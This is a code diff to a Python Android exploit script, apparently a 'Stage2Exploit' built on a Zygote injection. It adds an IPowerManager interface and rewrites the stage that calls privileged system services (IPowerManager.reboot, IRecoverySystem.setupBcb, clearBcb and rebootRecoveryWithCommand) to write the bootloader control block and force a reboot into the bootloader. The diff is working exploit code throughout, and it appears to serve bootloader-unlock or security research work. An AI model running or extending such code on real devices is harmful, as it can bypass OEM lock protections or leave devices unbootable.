@@ -65,14 +65,21 @@ def parse_boolean_result(result: bytes) -> bool:
     return bool(number)
 
 
-# ----- Load IOemLockService -----
+# ----- Load IOemLockService (既存) -----
 with open(Path(__file__).parent / "IOemLockService.aidl") as handle:
     oem_lock_service_aidl = handle.read()
 oem_lock_service = parse_aidl_interface(
     aidl.fromstring(oem_lock_service_aidl), "IOemLockService"
 )
 
-# ----- Load IRecoverySystem -----
+# ----- Load IPowerManager (追加) -----
+with open(Path(__file__).parent / "IPowerManager.aidl") as handle:
+    power_service_aidl = handle.read()
+power_service = parse_aidl_interface(
+    aidl.fromstring(power_service_aidl), "IPowerManager"
+)
+
+# ----- Load IRecoverySystem (追加) -----
 with open(Path(__file__).parent / "IRecoverySystem.aidl") as handle:
     recovery_service_aidl = handle.read()
 recovery_service = parse_aidl_interface(
@@ -81,6 +88,7 @@ recovery_service = parse_aidl_interface(
 
 known_services = {
     "oem_lock": oem_lock_service,
+    "power": power_service,
     "recovery": recovery_service,
 }
 
@@ -189,17 +197,25 @@ class Stage2Exploit:
                     'Your bootloader seems to be unlocked, try running "fastboot flashing ..."'
                 )
 
-            # ----- BCB write via IRecoverySystem (追加部分) -----
-            print("\n=== BCB Write via IRecoverySystem.setupBcb ===")
+            print("\n=== BCB Write Attempts (bootonce-bootloader) ===")
 
-            # 複数のコマンドを試行
-            commands = [
-                "bootonce-bootloader",
-                "reboot-bootloader",
-                "bootloader",
-                "fastboot"
-            ]
-            for cmd in commands:
+            print("\n[1] IPowerManager.reboot(\"bootloader\")")
+            try:
+                self.call_service(
+                    device_socket,
+                    "power",
+                    "reboot",
+                    False,          # confirm
+                    "bootloader", 
+                    False           # wait
+                )
+                print("SUCCESS: reboot command accepted, BCB written.")
+            except Exception as e:
+                print(f"FAILED: {e}")
+
+            # 2. IRecoverySystem.setupBcb with multiple commands
+            print("\n[2] IRecoverySystem.setupBcb")
+            for cmd in ["bootonce-bootloader", "reboot-bootloader", "bootloader", "fastboot"]:
                 try:
                     result = self.call_service(
                         device_socket,
@@ -208,30 +224,25 @@ class Stage2Exploit:
                         cmd
                     )
                     if result is True:
-                        print(f"[+] setupBcb('{cmd}') SUCCESS (BCB written)")
-                    elif result is False:
-                        print(f"[-] setupBcb('{cmd}') returned False (write failed)")
+                        print(f"  [+] setupBcb('{cmd}') succeeded (BCB written)")
                     else:
-                        print(f"[?] setupBcb('{cmd}') returned {result}")
-                except ZygoteInjectionException as e:
-                    # service call 自体が失敗した場合（例外発生）
-                    print(f"[!] setupBcb('{cmd}') failed: {e}")
+                        print(f"  [-] setupBcb('{cmd}') returned {result}")
                 except Exception as e:
-                    print(f"[!] setupBcb('{cmd}') unexpected error: {e}")
+                    print(f"  [!] setupBcb('{cmd}') failed: {e}")
 
-            # clearBcb を試行
-            print("\n=== Trying clearBcb ===")
+            # 3. IRecoverySystem.clearBcb (to test access)
+            print("\n[3] IRecoverySystem.clearBcb")
             try:
                 result = self.call_service(device_socket, "recovery", "clearBcb")
                 if result is True:
-                    print("[+] clearBcb succeeded (BCB cleared)")
+                    print("  [+] clearBcb succeeded (BCB cleared)")
                 else:
-                    print(f"[-] clearBcb returned {result}")
+                    print(f"  [-] clearBcb returned {result}")
             except Exception as e:
-                print(f"[!] clearBcb failed: {e}")
+                print(f"  [!] clearBcb failed: {e}")
 
-            # rebootRecoveryWithCommand (デバイスがリカバリに再起動するので注意)
-            print("\n=== Trying rebootRecoveryWithCommand (device will reboot to recovery if successful) ===")
+            # 4. IRecoverySystem.rebootRecoveryWithCommand (dangerous)
+            print("\n[4] IRecoverySystem.rebootRecoveryWithCommand(\"--bootonce-bootloader\")")
             try:
                 self.call_service(
                     device_socket,
@@ -239,9 +250,11 @@ class Stage2Exploit:
                     "rebootRecoveryWithCommand",
                     "--bootonce-bootloader"
                 )
-                print("[+] rebootRecoveryWithCommand accepted (device should reboot to recovery)")
+                print("  [+] rebootRecoveryWithCommand accepted (device will reboot to recovery)")
             except Exception as e:
-                print(f"[!] rebootRecoveryWithCommand failed: {e}")
+                print(f"  [!] rebootRecoveryWithCommand failed: {e}")
+
+            print("\n=== Done ===")
 
 
 # Stage2Exploit().exploit_stage2()
